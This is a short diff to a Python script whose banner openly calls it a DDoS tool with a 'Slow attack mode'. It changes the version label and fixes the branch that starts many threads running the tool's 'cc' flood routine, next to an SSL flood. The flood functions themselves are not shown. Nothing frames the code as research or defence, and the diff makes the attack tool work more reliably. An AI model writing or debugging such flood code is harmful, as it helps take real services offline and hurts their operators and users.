@@ -17,7 +17,7 @@ print ('''
      CC/////  CC/////   | ddos tool |/ 
       CCCCC/   CCCCC/   |___________|/
 >--------------------------------------------->
-Python3 version 1.6.1(Improve Slow attack)
+Python3 version 1.6.2(Fix error code)
                             C0d3d by Lee0n123
 ===============================================
          --> Added Slow attack mode <--
@@ -329,10 +329,10 @@ def main():
 			for i in range(thread_num):
 				th = threading.Thread(target = sslflood)
 				th.start()
-		if https == "" :
-				for i in range(thread_num):
-					th = threading.Thread(target = cc)
-					th.start()
+		else:				
+			for i in range(thread_num):
+				th = threading.Thread(target = cc)
+				th.start()
 	else:
 		print("[!] Input Error")
 		sys.exit()
